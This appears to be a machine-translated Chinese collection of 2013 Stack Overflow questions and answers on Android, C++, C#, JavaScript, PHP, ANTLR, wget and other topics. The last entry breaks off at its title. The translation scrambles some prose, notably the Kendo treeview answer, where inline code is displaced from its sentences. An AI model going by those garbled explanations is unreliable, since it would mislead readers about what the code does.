> ID：14379666
> 
> 赞同：1
> 
> 时间：2013-01-17T12:57:56.867
> 
> 标签：android, installation, version, apk

在我的应用程序中，我具有下载更高版本 apk 的功能，必须自动安装新的 apk。我正在从服务器下载应用程序并将其存储在一个文件夹中。然后尝试安装它。但得到解析错误。几天前它工作正常，但现在出现错误。如果转到下载新 apk 的文件夹并尝试安装它以覆盖以前的 apk，则它安装正确。但我需要自动安装的功能。请帮我。谢谢桑塔努

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:08:23.813

我以前只在场景中看到过这个错误一次，当时我正在做同样的事情并将apk下载到内部存储并尝试从那里安装它。这不起作用，因为 PackageManager 无法访问那里的更新 apk。

尝试下载到外部存储并从那里安装。

# c++ - 如何使用可变参数模板在类中定义类型？

> ID：14379667
> 
> 赞同：0
> 
> 时间：2013-01-17T12:57:59.277
> 
> 标签：c++, c++11, variadic-templates

我希望能够将类中的类型*f*定义为一个 std::function ，它接受多个参数，其数量和类型取决于类的模板参数，如下所示：

```
#include <functional>

template <typename ... Args>
class SomeClass
{
    typedef std::function<void(Args)> f;
}; 
```

但是，这不起作用。带有 -std=c++0x 的 g++ 因“错误：参数包未使用 '...' 展开。

我正试图围绕一堆新的 C++11 特性展开思考，我很可能错过了一个非常明显的解决方案。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:03:17.410

错误消息会告诉您确切的错误以及如何解决它...添加省略号：

```
typedef std::function<void(Args...)> f; 
```

# javascript - 如何在 GWT 中的画布中绘制

> ID：14379674
> 
> 赞同：1
> 
> 时间：2013-01-17T12:58:24.997
> 
> 标签：javascript, jquery, html, gwt, canvas

我有这个简单的 jQuery 代码，用于在 40 x 40 画布元素中绘制三角形：

```
var context1 = $("#arrow_left").get(0).getContext('2d');
context1.beginPath();
context1.moveTo(25,0);
context1.lineTo(0,20);
context1.lineTo(25,40);
context1.lineTo(25,0);
context1.fill();
context1.closePath(); 
```

现在我如何在 GWT 中做同样的事情？[在http://code.google.com/p/google-web-toolkit-incubator/wiki/GWTCanvas](http://code.google.com/p/google-web-toolkit-incubator/wiki/GWTCanvas)有一个教程，但页面本身说它已被弃用并建议使用[http://google-web-toolkit .googlecode.com/svn/javadoc/latest/com/google/gwt/canvas/client/Canvas.html](http://google-web-toolkit.googlecode.com/svn/javadoc/latest/com/google/gwt/canvas/client/Canvas.html)。然而，后者没有关于绘图的文档。谁能告诉我如何在 GWT 中做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T13:01:28.893

使用画布，您可以获得[Context2d](http://google-web-toolkit.googlecode.com/svn/javadoc/latest/com/google/gwt/canvas/dom/client/Context2d.html)对象，它与您的 context1 变量具有相同的方法。

只需调用相同的方法;-)

示例代码：

```
Canvas canvas = Canvas.createIfSupported();
Context2d context1 = canvas.getContext2d();
context1.beginPath();
context1.moveTo(25,0);
context1.lineTo(0,20);
context1.lineTo(25,40);
context1.lineTo(25,0);
context1.fill();
context1.closePath(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-17T13:08:46.753

我认为以下链接将对您有所帮助。它也有源代码。 [http://gwtcanvasdemo.appspot.com/](http://gwtcanvasdemo.appspot.com/)

在此之前下载 jwt-incubator [http://www.java2s.com/Code/JarDownload/gwt-incubator/gwt-incubator.jar.zip](http://www.java2s.com/Code/JarDownload/gwt-incubator/gwt-incubator.jar.zip)并在 .gwt.xml 文件中添加继承的模块。然后将此 jar 添加到库中。

# javascript - 加载方法 jQuery 和原生 JavaScript

> ID：14379680
> 
> 赞同：2
> 
> 时间：2013-01-17T12:58:31.017
> 
> 标签：javascript, jquery, object, load

我的页面上有一个`object`带有 SVG 图形的标签：

```
<object data="graphics.svg" type="image/svg+xml" id="graphics" /> 
```

我想执行一些需要完全加载 svg 文件的代码。所以使用 jQuery 我放了：

```
$('#graphics').load(function() {
    // some code
}) 
```

并使用本机 JavaScript 我输入：

```
$('#graphics')[0].addEventListener('load', function() {
    // some code
}); 
```

现在第二个片段有效，第一个无效。我在这里想念什么？我认为`embed`标签会提供另一种行为，但似乎没有区别。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:15:18.997

来自[jQuery 文档](http://api.jquery.com/load-event/)：

与图像一起使用时加载事件的注意事项 开发人员尝试使用 .load() 快捷方式解决的一个常见挑战是在图像（或图像集合）完全加载时执行一个函数。应该注意几个已知的警告。这些是：

*   它不能始终如一地工作，也不能可靠地跨浏览器

*   如果图像 src 设置为与以前相同的 src，它不会在 WebKit 中正确触发

*   它没有正确地冒泡 DOM 树

*   可以停止对已经存在于浏览器缓存中的图像进行触发

和：

当元素和所有子元素都已完全加载时，加载事件将发送到该元素。此事件可以发送到与 URL 关联的任何元素：图像、脚本、框架、iframe 和窗口对象。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-01-17T13:09:17.820

尝试类似的东西

```
var element = $("<object/>");
    element.load(function () {
)}; 
```

# c# - 如何使用 Moq 验证静态方法调用

> ID：14379689
> 
> 赞同：6
> 
> 时间：2013-01-17T12:58:50.950
> 
> 标签：c#, linq, unit-testing, moq

使用[这种方法](https://stackoverflow.com/questions/2407038/moqing-static-method-call-to-c-sharp-library-class)，我已经调用了我的静态方法`Action`，希望我可以在我的 Moq 单元测试中设置和验证调用。

正在测试的代码是：

```
public Action<Data> Calculate = x => CalculatorHelper.Calculate(x);

public void CalculateData(Data data)
{
    ...

    Calculate(data);

    ...
} 
```

测试是：

```
[Test]
public void CalculateIsCalled()
{
    _mockService.Setup(x => x.Calculate = CalculatorHelper.Calculate)
                .Verifiable();
    ...

    _mockService.VerifyAll();
} 
```

但是，中的参数`Setup()`抛出编译错误“表达式树不能包含赋值运算符”。

显然代码`x => x.Calculate = CalculatorHelper.Calculate`是不正确的，但是正确的编码方法是什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-17T13:03:30.607

`Calculate`应该返回一个指向 的新动作`CalculatorHelper.Calculate`，所以它应该是：

```
_mockService.Setup(x => x.Calculate).Returns(CalculatorHelper.Calculate)
            .Verifiable(); 
```

但是，要使其正常工作，`Calculate`需要是一个`virtual`属性，而不仅仅是一个字段。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-17T13:17:24.973

考虑到`Calculate`是公共领域这一事实，您甚至不需要 Moq （还假设您正在测试`CalculateData`调用委托）：

```
Data passedAsActionParameter = null;
var testedClass = new Calculator();
testedClass.Calculate = d => { passedAsActionParameter = d; };
var data = new Data();
testedClass.CalculateData(data);

Assert.That(passedAsActionParameter, Is.EqualTo(data)); 
```

# javascript - 在 div 中更新 AJAX 结果（召回）

> ID：14379691
> 
> 赞同：1
> 
> 时间：2013-01-17T12:59:02.477
> 
> 标签：javascript, html, ajax

我正在尝试通过 AJAX 更新 div。我正在开发基于在线浏览器的 MMORPG。我使用简单的链接和 href 指向我想要的 PHP 页面，但问题出在历史上，它真的堆积如山……所以无论如何，我得出的结论是 AXAJ 更好。我，用 attack.php 结果更新我的 div 时遇到问题......它只打了一次。我第二次单击该按钮，但没有任何反应。我使用了 Web Developer Web Console，我得到了这个

> [14:47:51.167] TypeError: document.getElementById(...) is null @stickmaniagame.com/test/indexajaxtest.php:40

在我的 indexajaxtest.php 第 40 行是

```
 document.getElementById("gif").style.visibility="visible"; 
```

我第一次点击没有问题，但第二次我得到这个错误，没有任何反应......

这是我的代码：

```
<!DOCTYPE html>
<html>
<head>
<?  include('includes/config.php');
?>
<script type="text/javascript">
var creatureId;
var i;
function attack(creatureId)
{
    document.getElementById("gif").style.visibility="";
    document.getElementById("gif").src="images/anim.gif";
    document.getElementById("attackbtn").style.visibility="hidden";
    setTimeout(function(){myTimer(creatureId)},2000);
}

function myTimer(creatureId)
{
    var x=document.getElementById("mySelect");
    var xmlhttp;
    document.getElementById("gif").style.visibility="hidden";
    document.getElementById("img").innerHTML="";
    document.getElementById("attackbtn").style.visibility="";

    if (window.XMLHttpRequest)
      {xmlhttp=new XMLHttpRequest(); }
    else
      {xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}

    xmlhttp.onreadystatechange=function()
      {  if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.getElementById("battle").innerHTML=xmlhttp.responseText;
        }
      }
    xmlhttp.open("GET","attack.php?creature="+creatureId,true);
    xmlhttp.send();
}

function attack2()
{
    document.getElementById("gif").style.visibility="visible";
    document.getElementById("gif").src="images/anim.gif";
    document.getElementById("attackbtn").style.visibility="hidden";
    setTimeout(function(){battle()},2000);
}

function battle()
{
    var x=document.getElementById("mySelect");
    var xmlhttp;
    document.getElementById("gif").style.visibility="hidden";
    document.getElementById("img").innerHTML="";
    document.getElementById("attackbtn").style.visibility="";

    if (window.XMLHttpRequest)
      {xmlhttp=new XMLHttpRequest(); }
    else
      {xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}

    xmlhttp.onreadystatechange=function()
      {  if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.getElementById("battle").innerHTML=xmlhttp.responseText;
        }
      }
    xmlhttp.open("GET","click.html",true);
    xmlhttp.send();
}
function reply_click(clicked_id)
{
    creatureId=clicked_id;
    myTimer(creatureId);
}
</script>
</head>
<body>

<h1>Attack</h1>
<div id="img"><img id="gif" style="visibility:hidden"></div>
<div id="battle" style="visibility:visible;"></div>
<input id="attackbtn" name="attackbtn" type="image" src="/test/images/attack.jpg" value="Attack" onclick="attack2()" />
<form>
<div onClick="if(document.getElementById('creatures').style.visibility=='visible')
                {document.getElementById('creatures').style.visibility='hidden';}
                else{document.getElementById('creatures').style.visibility='visible';}">
Creatures:
</div>
<div id="creatures" style="visibility:collapse;">
  <?
  $creatures = mysql_query("SELECT id, name FROM creatures ORDER BY level DESC limit 5");
while($row = mysql_fetch_array($creatures))
  {
      ?>
  <div id="<? echo $row['id']; ?>" style="margin-left:100px;" onClick="reply_click(this.id);">
  <img src="images/monster.jpg" height="30px" /><? echo $row['name']; ?>
</div>
<? } ?>
</div>
<input type="button" onclick="attack2()" value="Alert index of selected option">
</form>
</body>
</html> 
```

顺便说一句，测试帐户的登录信息是：
用户名：测试
密码：1234

链接：

[登录！重要的！www.stickmaniagame.com](http://stickmaniagame.com/)
[http://stickmaniagame.com/test/indexajaxtest.php 问题文件...](http://stickmaniagame.com/test/indexajaxtest.php)

# javascript - 显示 package.json 中的依赖项

> ID：14379699
> 
> 赞同：3
> 
> 时间：2013-01-17T12:59:36.160
> 
> 标签：javascript, node.js, npm

有没有办法可以显示我们在 nodejs 中安装的 Express、Jade、Stylus.. 的版本。捕获当前版本并将其显示在浏览器中。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T13:50:19.127

基本上是一个简单的

```
$ npm ls 
```

做你想做的事：它以递归方式为你提供所有已安装模块、它们的版本和它们的依赖项的列表，并带有相同的信息。

[正如您所要求的在您的浏览器中工作的解决方案：最简单的解决方案可能是使用child_process 模块](http://nodejs.org/api/child_process.html)从 Node.js 作为子进程运行该命令，并将子进程的stdout[属性通过](http://nodejs.org/api/child_process.html#child_process_child_stdout)[管道](http://nodejs.org/api/stream.html#stream_stream_pipe_destination_options)传输到 http 服务器的响应流.

然后你`npm ls`在浏览器中得到输出。

基本框架如下所示：

```
var spawn = require('child_process').spawn,
    http = require('http');

http.createServer(function (req, res) {
  var npm = spawn('npm', [ 'ls' ]);
  npm.stdout.pipe(res);
}).listen(3000); 
```

当然你可以让它更好，更舒适，等等:-)

评论更新：

```
var npm = spawn('npm', [ 'ls', '--json' ]); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T15:12:29.120

尽管 Golo Roden 的回复描述了一种有效的方式，但我认为打开一个单独的进程只是为了阅读一个版本太过分了。

您专门询问 package.json 中的版本，那么为什么不直接读取该文件并对其进行解析呢？我成功地为此使用了该`fs`模块。这是我的应用程序：

```
var application_root = __dirname,
    express = require('express'),
    path = require('path'),
    fs = require('fs');

var app = express();

app.configure(function () {
    app.use(express.bodyParser());
    app.use(express.methodOverride());
    app.use(app.router);
    app.use(express.static(path.join(application_root, "public")));
    app.use(express.errorHandler({ dumpExceptions: true, showStack: true }));
});

app.get('/api', function (req, res) {
    fs.readFile(application_root + '/package.json', function(err, fd) {
        console.log(err);
        console.log(fd);
        res.send('File data: ' + fd);
    });
});

app.listen(4242); 
```

当您请求 /api URL 时，这将在您的根文件夹中显示 package.json 文件的内容。如果您只想要特定依赖项的版本，您始终可以`fd`在回调中查询对象的属性并显示它。

当然，这里的缺点是这将始终读取文件而不是使用来自 npm 的“真实”版本，但是由于您的节点应用程序无论如何都会读取文件，我不明白为什么不这样做。

# javascript - 无法发布到 Facebook 订阅源

> ID：14379701
> 
> 赞同：-1
> 
> 时间：2013-01-17T12:59:42.557
> 
> 标签：javascript, jquery, facebook, facebook-graph-api, feed

我正在尝试在我朋友的时间线上发布消息。我正在使用以下代码。我也有正确的访问令牌，但我仍然无法发布。你可以看看这里是代码。

```
<script> 
    $(document).ready(function() {
        var token = "<?php echo $_SESSION['access_token'];?>";

alert()token; 

        $.post(
            "https://graph.facebook.com/<?php echo $sqlr['regidfriendsid']; ?>/feed", 
            {
                picture: "http://my.com/hi.jpg",
                link: "https://www.my.com/login.php?ref=owall",
                privacy: '{value: "EVERYONE"}',
                access_token: token,
                name: 'Facebook Dialogs',
                caption: 'Reference Documentation',
                message: " Click to see more? "
            }
        );
   });
</script> 
```

我不知道为什么会收到此错误。

```
{
    "error": {
        "message": "An access token is required to request this resource.",
        "type": "OAuthException",
        "code": 104
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:05:12.733

你检查`$_SESSION['access_token']`设置了吗？很可能不是，因此您将一个空令牌传递给 API。您可能会在服务器端或客户端（php 或 javascript）检查它，如果不是，则会产生错误。如果已设置，我会尝试使用 Facebook API 验证或重新生成您的令牌。

# wget - 我可以让 wget 只检索一个文件夹（及其子文件夹），还可以保存和重新链接外部图像吗？

> ID：14379710
> 
> 赞同：3
> 
> 时间：2013-01-17T13:00:15.580
> 
> 标签：wget

我正在尝试仅下载站点 www.idea.int 的 /publications/ 文件夹以包含在 USB 驱动器上以供离线查看。

我试过了：

```
wget --recursive --no-remove-listing -l inf --no-parent --adjust-extension 
 --no-cookies --convert-links --page-requisites http://www.idea.int/publications/ 
```

仅正确保存 /publications/ 和子文件夹。但是我们在这些页面上有从 static0.idea.int 检索的图像，这些图像既没有下载也没有重新链接，即使这样我也打开了`--page-requisites`标志。

所以我尝试了：

```
wget --recursive --no-remove-listing -l inf --no-parent --adjust-extension 
   --no-cookies --convert-links --page-requisites   
   --span-hosts --domains=idea.int http://offline.idea.int/publications/ 
```

希望这`--span-hosts`将允许通过该`convert-links`步骤下载和重新链接图像。但是，这忽略了该`--no-parent`选项，并且基本上下载了整个 www.idea.int 站点。

有没有办法可以下载 /publications/ 中的所有 HTML 页面以及这些页面中包含的所有图像资源（甚至在另一个域中）并重新链接它们以供离线查看？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-01-17T14:38:58.543

这已经很晚了，但是...

```
wget -p -k -r -np http://www.idea.int/publications/ 
```

...应该是正确的命令。

-p（或 --page-requisites）获取显示 HTML 页面所需的所有图像等。

-k（或 --convert-links）使下载的 HTML 或 CSS 中的链接指向本地文件。

-r（或--recursive）指定您想要递归下载（下载所有子项）

-np（或--no-parent）阻止它上升到父目录。

看起来您缺少的是 -p 标志。

注意：上面的一些文字来自 wget --help

# java - 命题逻辑 ANTLR 的 BNF 语法

> ID：14379711
> 
> 赞同：0
> 
> 时间：2013-01-17T13:00:22.073
> 
> 标签：java, logic, antlr, bnf

我正在尝试在 Antlr 中为命题逻辑创建 BNF 语法，但我不断收到错误消息：

java.lang.NoSuchFieldError: offendingToken

由于没有显示行号，我不知道错误在哪里。构建成功，但是当我输入示例输入时，树停在句子处，即 BNF 中定义的第一项。

这是我的 BNF：

```
grammar Grammar;

options {
    language = Java;
    output = AST;
    ASTLabelType=CommonTree;   
}

@header { 
    package antlr;
}

@members { 

}

@lexer::header { //lexer
    package antlr;
}

@lexer::members {

}

sentence: atomicsentence | complexsentence;

atomicsentence: 'T' | 'F' | symbol;

complexsentence: unop sentence | sentence binop sentence | (sentence);

unop: 'NOT';

binop: 'AND' | 'OR' | 'IMPLIES' | 'EQUIVALENT'; 

symbol: (LEXRULE)+;

LEXRULE: ('a'..'z')|('A'..'Z'); 
```

如果您在句子中注释掉复数句，原子句部分会起作用，直到它因没有 EOF 而终止。我不确定这应该去哪里，因为将它添加到句子中不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:04:31.297

**（已编辑）**

我已经重构了您的语法，因此它应该可以按您的预期工作。

```
grammar Grammar;

options {
    language = Java;
    output = AST;
    ASTLabelType=CommonTree;   
}

tokens {
    CODE;
       }

@header { 
    package antlr;
}

@members { 

}

@lexer::header { //lexer
    package antlr;
}

@lexer::members {

}

code    :   sentence -> ^(CODE code);

sentence: UNOP? complexsentence (BINOP sentence)?;

atomicsentence: 'T' | 'F' | SYMBOL;

complexsentence: atomicsentence | '(' sentence ')';

UNOP: 'NOT';

BINOP: 'AND' | 'OR' | 'IMPLIES' | 'EQUIVALENT'; 

SYMBOL: LEXRULE+;

fragment
LEXRULE: ('a'..'z')|('A'..'Z'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T16:36:03.853

您的语法是递归的，ANTLR 在尝试生成解析器时提到了这一点：

> [17:31:32] 错误（210）：以下规则集相互左递归 [complexsentence, sentence] [17:31:32] 中止，因为以下规则相互左递归：[[T.complexsentence ,index=4,line=15], [T.sentence,index=2,line=11]]

规则`sentence`匹配 a `complexsentence`，而`complexsentence`规则又匹配 a `sentence`。ANTLR (v3) 无法处理这种左递归规则。

您的语法的另一个问题是您没有用于 whiate 空格的词法分析器规则，但您的示例输入`"NOT p"`包含一个空格。

有关使用 ANTLR 的简单表达式解析器，请参见：

*   [ANTLR：有一个简单的例子吗？](https://stackoverflow.com/questions/1931307/antlr-is-there-a-simple-example/1932664#1932664)
*   [使用 ANTLR 3.3？](https://stackoverflow.com/questions/4396080/antlr-3-3-c-sharp-tutorials/4397799#4397799)

# c# - 将一个字节转换为带有真假标志的 8 位

> ID：14379716
> 
> 赞同：2
> 
> 时间：2013-01-17T13:00:53.423
> 
> 标签：c#, .net, byte, bit, bitarray

我正在尝试阅读 a`byte`并转换为`bit`. 我正在尝试创建一个标记系统。

所以字节 3 将提高前两个标志为真。但是，当我尝试转换它时，它只是将 的值`byte`作为`BitArray`. 非常感谢任何帮助。

```
BinaryReader br = new BinaryReader(filestream);

Byte flag = br.ReadByte();

BitArray flags = new BitArray(flag); 

record.Isbool = flags[0];
record.Isbool1 = flags[1];

etc 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T13:04:21.373

`new BitArray(flag);`使用`BitArray(Int32 length)`构造函数。这设置了容量，而不是你想要的。

您可以使用

```
 new BitArray(new byte[] { flag }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T13:03:58.300

你需要使用

```
BitArray flags = new BitArray(new byte[] {flag}); 
```

`byte[]`重载使用字节中的位；目前你正在调用`int`重载，它给出了你发现的长度。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-17T13:04:18.123

```
BinaryReader br = new BinaryReader(filestream);

Byte flag = br.ReadByte();

BitArray flags = new BitArray(new byte[] {flag}); 

record.Isbool = flags[0];
record.Isbool1 = flags[1]; 
```

通过调用[`BitArray(byte[])`](http://msdn.microsoft.com/en-us/library/x1xda43a.aspx)构造函数应该可以工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-17T13:04:46.693

你有没有尝试掩饰。int flag = value & 0x01 来屏蔽第一位。

# c - 谜题 - 以 C 语言以人类可读的形式打印时间；ctime, asctime

> ID：14379720
> 
> 赞同：1
> 
> 时间：2013-01-17T13:00:58.823
> 
> 标签：c, ctime, time-t

有一个我认为我知道正确答案的谜题，但我也有一个问题。看一看：

```
Sample Code 
void printTime( time_t *t ) 
{ 
???? 
} 
```

以下哪一项可以代替???? 在上面的代码中以人类可读的形式打印在 t 中传递的时间？

1.  ：

    ```
    char s[ 100 ];
    ctime( t, s ); 
    printf( "%s\n", s ); 
    ```

2.  ：

    ```
    printf( "%s\n", ctime( t ) ); 
    ```

3.  ：

    ```
    printf( "%s\n", asctime( t ) ); 
    ```

4.  ：

    ```
    printf( "%s", t ); 
    ```

5.  ：

    ```
    char *s = ctime( t ); 
    printf( "%s\n", s ); 
    free( s ); 
    ```

我的答案是答案 2（函数 ctime 将 time_t 指针作为输入并返回一个指向字符串的指针，然后可以通过 printf 打印该字符串）。

答案 5 的代码在编译时也能正常工作，但为什么我们要在以前没有分配存储空间的情况下使用 free() 呢？您认为这就是答案 5 错误的原因吗？

谢谢你，普热梅克

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T14:02:39.267

1.  这种方式行不通，[`ctime_r`](http://linux.die.net/man/3/ctime_r) 改用。
2.  **有效并且是正确的。**
3.  类型错误，您必须先转换它，例如使用[`localtime`](http://linux.die.net/man/3/localtime).
4.  错误的可变参数类型，`char*`预期但`time_t*`已给出。
5.  不正确的空闲，因为`ctime`管理其缓冲区本身，例如使用静态缓冲区。

一般来说，这些函数中的大多数（即`asctime`, `ctime`, `localtime`...）现在有两种变体：使用一些静态分配的缓冲区来保存返回值的历史形式，以及带有`_r`代表*reentrant*的后缀的更现代的版本。对于后者，您必须自己提供输出缓冲区，这意味着您负责分配它。最大的优点是多个线程可以同时使用可重入版本，而不必担心覆盖彼此的结果。

# kendo-ui - 如何在 Kendo 树视图中找到嵌套节点，其中数据通过 web-api “延迟”提供

> ID：14379721
> 
> 赞同：5
> 
> 时间：2013-01-17T13:00:58.923
> 
> 标签：kendo-ui

我知道在 Kendo 树视图中找到嵌套节点的确切路径。所以我希望扩展这条路线上的所有节点以到达那里。我知道如何找到一个节点并使 Kendo 扩展该节点。

我的 Treeview 对其数据使用 web-api 并且一切正常。架构定义如下：

```
 schema: {
                model: {
                    id: "CodeList",
                    hasChildren: "HasKids"
                }
            } 
```

我想要实现的是树自动扩展到嵌套级别。假设我知道到达节点的路径是“Level1CodeA|Level2CodeA|Level3CodeA”，所以首先我希望找到我可以做的代码“Level1CodeA”。
然后我希望展开这个节点（在内部它检索这个节点下的数据并展开 ok），然后我想找到“Level2CodeA”，重复这个过程，然后找到然后选择 Level3CodeA。

我该怎么办？我正在寻找一个“AfterExpanded”事件，我可以用它来开始下一次搜索和展开操作，但我找不到任何可以使用的事件。我在我的数据源上尝试了“更改”事件，但这被触发了很多次，我似乎无法将其缩小到正确的项目..

非常感谢。

编辑：更多代码

```
<script id="treeII-template" type="text/kendo-ui-template">
    <img id="explorerItemImg" src="#: item.Image #" />
    <span id="explorerItemCode">#: item.Code #</span> - 
    <span id="explorerItemFullName">#: item.FullName #</span>
    # if (item.Level < (item.Levels - 1)) { #
        [<span id="explorerItemLCount">#: item.LCount #</span>]
    # } #
    # if (item.HasKids) { #
        [<span id="explorerItemPCount">#: item.PCount #</span>]
    # } #

</script> 
```

创建 HierarchicalDataSource 并将其分配给树视图的代码：

```
 // -----------------
    // set the datasource for the bottom explorer...
    // -----------------
    var loadDataForExplorerGroup = function (context, groupid, groupsequence) {

        // hang on to this context/groupid
        sessionStorage.setItem(context + "_explorer_groupId", groupid);
        sessionStorage.setItem(context + "_explorer_groupSequence", groupsequence);

        // define the datasource and attach it to the explorer-tree
        explorerGroupData = new kendo.data.HierarchicalDataSource({
            transport: {
                read: {
                    url: "/api/explorerapi/GetExplorerData?",
                    data: {
                        context: "portfolio",
                        groupid: groupid,
                        groupsequence: groupsequence,
                        userid: sessionStorage.getItem("symUserID")
                    }
                }
            },
            schema: {
                model: {
                    id: "CodeList",
                    hasChildren: "HasKids"
                }
            }
        });

        // simply assign the data source again to the tree
        $("#idExplBottomTree").data("kendoTreeView").setDataSource(explorerGroupData);

    }; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-17T23:46:51.967

那个`AfterExpanded`事件可能是[`dataBound`](http://docs.kendoui.com/api/web/treeview#databound)。我建议给出以下`TreeView`定义：

```
var tree = $("#treeview").kendoTreeView({
    dataSource   : data,
    dataTextField: "text",
    dataBound    : function (e) {
        treeNavigateNext();
    }
}).data("kendoTreeView"); 
```

我添加`dataBound`了调用`treeNavigate`定义为的处理程序：

```
function treeNavigateNext() {
    if (search.length > 0) {
        var first = tree.findByText(search[0]);
        if (first) {
            search.shift();
            tree.expand(first);
        }
    }
} 
```

where是包含我们要导航的每个节点`search`的数组。`dataTextField`

例子：

```
search = [];
search.push("t_3");
search.push("t_32");
search.push("t_321");
search.push("t_3214"); 
```

定义我们想要`expand`一个节点，其中文本是`t_3`，然后`t_32`，下一个`t_321`，最后`t_3214`。

因此`treeNavigateNext`检查是否还有待处理的东西 ( `search.length > 0`)，如果是，则通过 ( ) 找到元素，从`text`( )`var first = tree.findByText(search[0]);`中删除元素，最后从节点 ( `search`)中删除。这会导致下一个级别被加载，当接收到的事件被触发时，我将进入下一个级别。`search.shift();``expand``tree.expand(first)``dataBound`

看到它在[这里运行](http://jsfiddle.net/OnaBai/CFWGd/)

**编辑：**如果不是通过文本搜索，您更喜欢导航`id`然后添加到不同节点的`search`数组`id`并使用以下`treeNavigateNext`函数：

```
function treeNavigateNext() {
    if (search.length > 0) {
        var first = tree.dataSource.get(search[0]);
        if (first) {
            search.shift();
            var elem = tree.findByUid(first.uid);
            tree.expand(elem);
        } 
    }
} 
```

新的运行示例[在这里](http://jsfiddle.net/OnaBai/CFWGd/2/)

# mpdf - 如何仅删除第一页的页眉页脚 - mpdf

> ID：14379725
> 
> 赞同：3
> 
> 时间：2013-01-17T13:01:20.250
> 
> 标签：mpdf

Mpdf中的以下两个函数在所有页面中添加页眉和页脚。

SetHTMLHeader() SetHTMLFooter()

但是，有人请帮我从pdf的第一页删除页眉和页脚吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-26T12:10:58.010

mPDF 有一个名为“show-this-page”的选项： -`0`我猜，将其设置为不会在第一页上显示。

看看文档： [http ://mpdf1.com/manual/index.php?tid=253](http://mpdf1.com/manual/index.php?tid=253)

# php - max_file_uploads 工作

> ID：14379727
> 
> 赞同：3
> 
> 时间：2013-01-17T13:01:20.967
> 
> 标签：php

如何`max_file_uploads`工作？

> `php.ini`文件显示“可以通过单个请求上传的最大文件数” 。（[链接](http://php.net/manual/en/ini.core.php#ini.max-file-uploads)）

那么这是否意味着在外站点注册的每个用户将能够一次上传 20 个文件，或者是整个站点一次可以上传的文件总数的 20 个。因此，如果注册用户 1 正在上传 20 个文件，而注册用户 2 正在同时上传 20 个文件，那么其中一个会工作还是停止工作？

我将在共享主机上。我对“单一请求”部分有点困惑。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-17T13:02:41.873

每个请求是指对应用程序发出的每个 HTTP 请求。

请求不是每个注册用户或任何东西。请求是通过 HTTP 发送到您的服务器的每次传输。每当有人使用您的文件上传页面时，他/她都可以上传设置允许的尽可能多的文件。一旦这些文件被上传（或者甚至在上传时），用户可以在单独的请求中上传另外 20 个（或任何设置）。

# c++ - 运算符在数组声明中如何操作？

> ID：14379734
> 
> 赞同：3
> 
> 时间：2013-01-17T13:01:51.657
> 
> 标签：c++

为什么`int a[x,y]`转换成`a[y]`, 因为逗号运算符从左到右操作？我希望`a[(x,y)]`，因为内部操作将首先完成。但在第一个中，它应该采用第一个参数。

我不打算使用逗号运算符进行数组初始化，只是想问为什么会这样。

我在一本书里读过，我很困惑。

**更新：**

[维基百科说](http://en.wikipedia.org/wiki/Comma_operator)：

```
 i = a, b, c;            // stores a into i 
 i = (a, b, c);          // stores c into i 
```

因此，正如第一行代码在数组中所说，第一个值必须分配给数组。注意：我实际上并不打算使用它。我只是问问。我正在学习 C++，我读过一本在数组声明 a[y,x]; 中写的书。所以应该是 a[y], x; 没有税]。为什么编译器会这样做？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-17T13:06:51.587

逗号运算符`,`也称为“忘记”运算符。它执行以下操作：

1.  完全计算左操作数
2.  忘记它的价值
3.  完全评估正确的操作数
4.  使用右操作数的值作为整个运算符表达式的值。

因此，在您的情况下，它的行为应如此。`a[x, y]`首先计算`x`，然后丢弃它的值，然后使用 的值`y`作为整个表达式的值（括号中的那个）。

**编辑**

关于您对维基百科的编辑。请注意， 的优先级`,`低于 的`=`。换句话说，

```
i = a, b, c; 
```

被解释为

```
(i = a), b, c; 
```

这就是为什么`a`被复制到`i`. 但是，*整个表达式*的结果仍然是`c`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:13:50.527

我相信您的编译器假设您打算添加括号。在 C++ 中有一个逗号运算符和一个逗号分隔符。逗号运算符本身及其操作数必须用括号括起来。int 数组构造函数只需要一个值，所以我猜你的编译器正试图帮助你。

[http://msdn.microsoft.com/en-us/library/zs06xbxh(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/zs06xbxh(v=vs.80).aspx)

编辑： int a[x,y] 无效；int a[(x,y)] 有效；他的编译器假设他打算添加括号。在更一般的上下文中，逗号运算符不需要括号。在函数调用和初始化程序中，需要括号来区分使用逗号运算符和逗号分隔符。

# c++ - 如何在 WinAPI 中创建附加控件？只有第一个控件有效吗？

> ID：14379736
> 
> 赞同：0
> 
> 时间：2013-01-17T13:02:02.993
> 
> 标签：c++, winapi, button

